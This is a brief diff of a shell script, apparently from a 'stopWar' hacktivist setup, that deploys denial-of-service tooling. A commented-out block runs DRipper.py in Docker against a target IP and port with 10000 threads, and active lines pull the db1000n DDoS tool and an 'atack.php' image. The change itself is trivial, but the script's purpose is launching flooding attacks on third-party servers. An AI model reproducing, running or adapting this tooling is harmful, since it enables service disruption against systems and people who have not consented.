@@ -14,7 +14,7 @@ cd /root/stopWar
 #	/usr/bin/docker run -d cherniavsky94/stop-war python3 DRipper.py -s $ip -p $port -t 443 -q 10000 > docker.list
 #    fi
 #done
-
+#
 /usr/bin/docker pull ghcr.io/arriven/db1000n
 /usr/bin/docker pull angello2docker/atack.php
 
